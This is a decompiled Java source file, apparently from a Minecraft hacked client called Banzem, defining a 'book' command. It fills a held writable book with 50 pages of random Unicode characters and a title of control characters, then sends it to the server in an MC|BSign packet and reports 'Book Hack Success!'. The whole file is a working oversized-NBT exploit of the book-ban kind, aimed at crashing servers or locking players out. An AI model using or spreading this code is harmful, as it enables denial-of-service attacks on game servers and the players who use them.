//Deobfuscated with https://github.com/PetoPetko/Minecraft-Deobfuscator3000 using mappings "1.12 stable mappings"!

// 
// Decompiled by Procyon v0.5.36
// 

package me.mohalk.banzem.features.command.commands;

import java.util.stream.IntStream;
import net.minecraft.item.ItemStack;
import me.mohalk.banzem.Banzem;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.network.PacketBuffer;
import io.netty.buffer.Unpooled;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagList;
import java.util.stream.Collector;
import java.util.stream.Collectors;
import java.util.Random;
import net.minecraft.init.Items;
import me.mohalk.banzem.features.command.Command;

public class BookCommand extends Command
{
    public BookCommand() {
        super("book", new String[0]);
    }
    
    @Override
    public void execute(final String[] commands) {
        final ItemStack heldItem = BookCommand.mc.player.getHeldItemMainhand();
        if (heldItem.getItem() == Items.WRITABLE_BOOK) {
            final int limit = 50;
            final Random rand = new Random();
            final IntStream characterGenerator = rand.ints(128, 1112063).map(i -> (i < 55296) ? i : (i + 2048));
            final String joinedPages = characterGenerator.limit(10500L).mapToObj(i -> String.valueOf((char)i)).collect(Collectors.joining());
            final NBTTagList pages = new NBTTagList();
            for (int page = 0; page < 50; ++page) {
                pages.appendTag((NBTBase)new NBTTagString(joinedPages.substring(page * 210, (page + 1) * 210)));
            }
            if (heldItem.hasTagCompound()) {
                heldItem.getTagCompound().setTag("pages", (NBTBase)pages);
            }
            else {
                heldItem.setTagInfo("pages", (NBTBase)pages);
            }
            final StringBuilder stackName = new StringBuilder();
            for (int i2 = 0; i2 < 16; ++i2) {
                stackName.append("\u0014\f");
            }
            heldItem.setTagInfo("author", (NBTBase)new NBTTagString(BookCommand.mc.player.getName()));
            heldItem.setTagInfo("title", (NBTBase)new NBTTagString(stackName.toString()));
            final PacketBuffer buf = new PacketBuffer(Unpooled.buffer());
            buf.writeItemStack(heldItem);
            BookCommand.mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("MC|BSign", buf));
            Command.sendMessage(Banzem.commandManager.getPrefix() + "Book Hack Success!");
        }
        else {
            Command.sendMessage(Banzem.commandManager.getPrefix() + "b1g 3rr0r!");
        }
    }
}
